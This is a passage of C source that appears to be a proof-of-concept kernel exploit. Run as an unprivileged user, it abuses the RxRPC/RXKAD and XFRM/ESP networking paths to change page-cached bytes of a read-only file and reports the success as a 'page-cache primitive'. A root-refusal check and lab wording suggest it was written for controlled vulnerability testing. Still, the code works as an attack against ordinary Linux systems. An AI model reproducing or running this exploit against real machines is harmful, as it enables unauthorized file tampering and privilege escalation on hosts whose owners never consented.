	close(rxsk_cli);
	close(udp_srv);
	syscall(SYS_keyctl, 3, key);
	return 0;

trig_fail:
	close(p[0]); close(p[1]);
	close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
	return -1;
}

static void print_hex8(const char *label, const uint8_t bytes[8])
{
	fprintf(stderr, "%s", label);
	for (size_t i = 0; i < 8; i++)
		fprintf(stderr, "%s%02x", i ? " " : "", bytes[i]);
	fputc('\n', stderr);
}

static int rxrpc_poc(void)
{
	uint8_t before[8], after[8];

	/* Opening AF_RXRPC also loads the key type used by add_key(). */
	int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (dummy < 0) {
		WARN("socket(AF_RXRPC): %s", strerror(errno));
		return 2;
	}
	close(dummy);

	int fd = open(RXRPC_TARGET, O_RDONLY);
	if (fd < 0) {
		WARN("open %s: %s", RXRPC_TARGET, strerror(errno));
		return 2;
	}

	struct stat st;
	if (fstat(fd, &st) < 0 || st.st_size < 8) {
		WARN("fixture is missing or too small");
		close(fd);
		return 2;
	}

	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED) {
		WARN("mmap: %s", strerror(errno));
		close(fd);
		return 2;
	}
	memcpy(before, map, sizeof(before));

	fprintf(stderr,
		"[rxrpc] target=%s uid=%u mode=%04o caller=%u\n",
		RXRPC_TARGET, st.st_uid, st.st_mode & 07777, getuid());
	print_hex8("[rxrpc] before: ", before);

	if (do_one_trigger(fd, 0, sizeof(before)) < 0) {
		WARN("protocol trigger failed before verification");
		munmap(map, 4096);
		close(fd);
		return 3;
	}

	memcpy(after, map, sizeof(after));
	print_hex8("[rxrpc] after : ", after);
	munmap(map, 4096);
	close(fd);

	if (memcmp(before, after, sizeof(before)) == 0) {
		fprintf(stderr,
			"[rxrpc] fixture unchanged: shared-frag write was rejected\n");
		return 1;
	}

	fprintf(stderr,
		"[rxrpc] page-cache primitive observed: eight cached bytes changed\n");
	return 0;
}

static void usage(const char *program)
{
	fprintf(stderr,
		"usage: %s --esp|--rxrpc [--verbose]\n\n"
		"  --esp      write N4C! to %s through XFRM/ESP\n"
		"  --rxrpc    mutate eight cached bytes in %s through RxRPC/RXKAD\n"
		"  --verbose  show protocol setup details\n",
		program, ESP_TARGET, RXRPC_TARGET);
}

int main(int argc, char **argv)
{
	enum { MODE_NONE, MODE_ESP, MODE_RXRPC } mode = MODE_NONE;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--esp"))
			mode = MODE_ESP;
		else if (!strcmp(argv[i], "--rxrpc"))
			mode = MODE_RXRPC;
		else if (!strcmp(argv[i], "--verbose"))
			verbose = 1;
		else {
			usage(argv[0]);
			return 2;
		}
	}

	if (mode == MODE_NONE) {
		usage(argv[0]);
		return 2;
	}

	if (geteuid() == 0) {
		fprintf(stderr, "refusing to run as root; use run-as-1000 in the lab\n");
		return 2;
	}

	return mode == MODE_ESP ? esp_poc() : rxrpc_poc();
}
